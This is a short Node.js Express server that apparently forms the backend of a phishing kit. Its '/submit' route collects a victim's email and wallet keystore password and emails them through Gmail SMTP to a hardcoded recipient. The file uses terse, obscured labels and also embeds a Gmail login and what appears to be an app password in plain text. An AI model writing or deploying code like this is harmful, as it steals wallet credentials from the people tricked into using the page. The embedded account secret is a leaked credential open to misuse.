const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.use(express.static(path.join(__dirname, 'public')));

const maillist = [
  'willyscotmegan@gmail.com',
];

const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: {
    user: process.env.EMAIL_USER || "divasnow178@gmail.com",
    pass: process.env.EMAIL_PASS || "cfoyhwlljngpvera",
  },
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'app.html'));
});

app.post('/submit', async (req, res) => {
  try {
    console.log('Srcvd:', req.body);

    const { wName, psdWet } = req.body;

    const mailOptions = {
      from: '"Deets" <divasnow178@gmail.com>',
      to: maillist,
      html: `
        <p><strong>Eml:</strong> ${wName || 'Not provided'}</p>
        <p><strong>Pswd (if keystore):</strong> ${psdWet || 'Not provided'}</p>
      `
    };

    const info = await transporter.sendMail(mailOptions);

    res.status(200).send('Wdestscesful');
  } catch (error) {
    console.error('err', error);
    res.status(500).send('Errwetdets');
  }
});

app.listen(port, () => {
  console.log(``);
});

module.exports = app;